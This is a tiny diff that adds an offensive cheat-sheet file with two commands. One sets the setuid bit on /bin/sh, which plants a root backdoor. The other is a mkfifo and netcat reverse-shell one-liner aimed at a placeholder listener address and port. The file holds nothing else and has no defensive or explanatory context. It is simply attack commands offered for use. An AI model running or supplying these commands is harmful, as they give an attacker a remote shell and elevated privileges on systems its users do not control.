@@ -1,0 +1,7 @@
+# Reverse shell option 1
+
+chmod +s  /bin/sh
+
+# Reverse shell magic
+
+rm /tmp/f;mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc LISTEN_IP PORT > /tmp/f
